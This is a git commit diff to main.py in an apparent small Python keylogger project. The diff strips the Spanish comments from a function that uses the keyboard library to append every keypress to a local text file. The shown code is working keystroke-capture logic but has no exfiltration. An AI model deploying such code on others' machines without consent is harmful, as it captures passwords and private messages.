9d92169474ad7b186ca6558034a62eccce657f4e
emiliocraft23 <48366274+emiliocraft23@users.noreply.github.com>
2026-04-23 15:01:46 -0500

    Update main.py

--- main.py
+++ main.py
@@ -3,14 +3,9 @@ import keyboard
 LOG_FILE = "captura de teclado.txt"
 
 def on_key_press(event):
-    """
-    Función que se ejecuta cada vez que se presiona una tecla.
-    Escribe la tecla en el archivo de registro.
-    """
+
     with open(LOG_FILE, "a", encoding="utf-8") as f:
-        # Si la tecla tiene un nombre de un solo carácter (como letras o números),
-        # lo escribimos directamente. Si no (como 'space', 'enter', 'shift'),
-        # lo escribimos entre corchetes para distinguirlo.
+
         if len(event.name) == 1:
             f.write(event.name)
         elif event.name == "space":
